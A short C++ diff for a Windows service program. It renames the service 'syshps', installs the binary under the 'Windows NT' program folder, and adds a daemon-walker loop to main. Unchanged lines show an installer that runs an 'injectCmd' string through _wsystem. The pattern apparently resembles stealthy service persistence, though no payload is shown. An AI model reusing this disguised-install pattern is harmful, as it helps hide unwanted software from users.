@@ -4,8 +4,10 @@
 #include "global.h"
 #include "log4c.h"
 
-const wchar_t* SVC_NAME = L"Syshps";
-const wchar_t* DST_BIN = L"C:\\Program Files\\Windows NT\\Syshps.exe";
+#include "daemon.h"
+
+const wchar_t* SVC_NAME = L"syshps";
+const wchar_t* DST_BIN = L"C:\\Program Files\\Windows NT\\syshps.exe";
 static SERVICE_STATUS svcStat_;
 static SERVICE_STATUS_HANDLE svcHandle_;
 
@@ -64,6 +66,15 @@ void init_as_installer()
 	_wsystem(injectCmd.c_str());
 }
 
+void init_daemons() {
+	DaemonWalker daemonWalker;
+	daemonWalker.start();
+	
+	do {
+		::Sleep(500);
+	} while (daemonWalker.isEnd() != true);
+}
+
 int main(int argc, char **argv)
 {
 	wstring logFile(L"my.log");
@@ -78,6 +89,7 @@ int main(int argc, char **argv)
 		}
 	} else {
 		//init_as_installer();
+		init_daemons();
 		init_as_test();
 	}
 	
